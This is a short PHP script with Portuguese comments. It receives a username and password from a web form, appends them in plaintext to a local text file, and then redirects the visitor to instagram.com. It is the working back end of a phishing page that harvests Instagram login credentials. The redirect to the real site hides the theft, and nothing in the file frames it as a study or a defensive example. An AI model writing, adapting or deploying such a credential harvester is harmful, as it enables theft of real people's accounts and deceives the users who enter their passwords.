<?php
// Verifica se os campos de usuário e senha foram enviados
if(isset($_POST['username']) && isset($_POST['password'])) {
    // Obtém os valores dos campos de usuário e senha
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Define o nome do arquivo onde as informações serão salvas
    $file = "informacoes.txt";
    
    // Formata os dados a serem escritos no arquivo
    $data = "Usuário: " . $username . " - Senha: " . $password . "\n";
    
    // Abre o arquivo em modo de escrita e verifica se foi aberto com sucesso
    if($handle = fopen($file, 'a')) {
        // Escreve os dados no arquivo e fecha o arquivo
        fwrite($handle, $data);
        fclose($handle);
        
        // Redireciona o usuário para outra página
        header("Location: https://www.instagram.com");
        exit();
    } else {
        // Se não foi possível abrir o arquivo, exibe uma mensagem de erro
        echo "Erro ao abrir o arquivo.";
    }
}
?>
